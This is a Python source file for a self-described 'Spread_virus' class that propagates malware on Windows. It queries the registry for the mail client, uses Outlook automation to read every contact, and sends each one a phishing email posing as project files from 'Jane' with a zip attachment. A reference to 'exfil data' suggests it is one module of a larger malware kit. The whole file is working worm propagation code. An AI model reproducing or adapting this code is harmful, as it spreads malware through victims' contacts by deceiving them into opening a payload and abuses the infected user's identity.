import winreg 
import win32com.client
import os

class Spread_virus:

    def __init__(self):
        pass

    def discover_email_client(self):
        """
        Tries to discover if an email client is installed, so it can be used to send a phising email to contacts
        """
        try:
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r"mailto\shell\open\command") as key:
                value, _ = winreg.QueryValueEx(key, None)
                return value.split('"')[1]  # Extract executable path
        except FileNotFoundError:
                return None

    def get_address_book(self):
        """
        a method that fetches the address book of the installed outlook client and sends a mail to all the contacts in the address book
        """
        outlook = win32com.client.Dispatch("Outlook.Application")
        namespace = outlook.GetNamespace("MAPI")
        address_book = namespace.GetDefaultFolder(10).Items  # 10 corresponds to the Contacts folder
        # Loop through the contacts and print the names and email addresses
        for contact in address_book:
            if contact.Class == 40:  # Class 40 corresponds to ContactItem
                print(f"Name: {contact.FullName}, Email: {contact.Email1Address}")
                try:
                    self.send_phising_mail(contact.FullName, contact.Email1Address)
                    print("Email Sent!")

                except Exception as e:
                    print("Failed to send email")
                    print(e)
    

    def send_phising_mail(self,full_name ,recipient):
        """
        Sends a phising email
        """

        phising_email = f"""
Hi {full_name},

I’ve attached the updated project files we discussed last week. Let me know if you have any questions or need further changes.

Looking forward to your feedback.

Best regards,
Jane
"""

        outlook = win32com.client.Dispatch("Outlook.Application")
        mail = outlook.CreateItem(0)
        mail.To = recipient
        mail.Subject = "Last Weeks Discussion"
        mail.Body = phising_email
        attachment_path = os.path.abspath("spreadvirusModule/coding_file.zip")
        mail.Attachments.Add(attachment_path)
        mail.Send()

def automate():
    try:
        virus = Spread_virus()
        virus.get_address_book()
        return True #return True to the exfil data if the email was succesfully sent
    except:
        return False

    


if __name__ == "__main__":

    virus = Spread_virus()
    virus.get_address_book()